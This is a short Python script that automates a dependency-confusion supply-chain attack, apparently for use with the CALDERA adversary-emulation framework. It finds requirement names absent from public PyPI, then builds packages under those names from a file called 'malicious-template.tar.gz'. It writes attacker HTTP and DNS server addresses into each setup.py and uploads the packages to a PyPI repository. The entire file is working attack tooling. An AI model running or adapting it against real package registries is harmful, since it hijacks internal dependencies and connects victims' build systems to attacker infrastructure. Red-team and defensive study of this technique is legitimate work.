#!/usr/bin/env python3
import argparse
import os
import shutil
import subprocess

import requirements
from packaging import version
from pypi_simple import PyPISimple, PYPI_SIMPLE_ENDPOINT


def query_latest_version(project_name: str, endpoint: str = PYPI_SIMPLE_ENDPOINT) -> version:
    with PyPISimple(endpoint=endpoint) as client:
        response = client.get_project_page(project_name)
        if response is None:
            return None
        all_versions = [version.parse(package.version) for package in response.packages]
        return max(all_versions)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('caldera_http_server')
    parser.add_argument('caldera_dns_server')
    parser.add_argument('requirements_file')
    parser.add_argument('pypi_repo_name')
    args = parser.parse_args()
    caldera_http_server = args.caldera_http_server
    caldera_dns_server = args.caldera_dns_server
    requirements_file = args.requirements_file
    pypi_repo_name = args.pypi_repo_name
    target_packages = set()
    with open(requirements_file) as f:
        for req in requirements.parse(f):
            if query_latest_version(req.name) is None:
                target_packages.add(req.name)
    if len(target_packages) == 0:
        print("Couldn't find an internal package to target")
        return
    template_tarball = os.path.abspath('./malicious-template.tar.gz')
    for target_package in target_packages:
        print(f'Identified target package "{target_package}"')
        tmp_dir = os.path.join('/tmp', target_package)
        shutil.rmtree(tmp_dir, ignore_errors=True)
        os.makedirs(tmp_dir, exist_ok=True)
        subprocess.run(['tar', 'xf', template_tarball, '-C', tmp_dir])
        os.chdir(tmp_dir)
        subprocess.run(['sed', '-i', f"s@caldera_http_server = 'placeholder'@caldera_http_server = '{caldera_http_server}'@g", 'setup.py'])
        subprocess.run(['sed', '-i', f"s@caldera_dns_server = 'placeholder'@caldera_dns_server = '{caldera_dns_server}'@g", 'setup.py'])
        subprocess.run(['sed', '-i', f"s@package_name = 'placeholder'@package_name = '{target_package}'@g", 'setup.py'])
        shutil.move('placeholder', target_package)
        subprocess.run(['python3', 'setup.py', 'sdist', 'upload', '-r', pypi_repo_name])


if __name__ == '__main__':
    main()
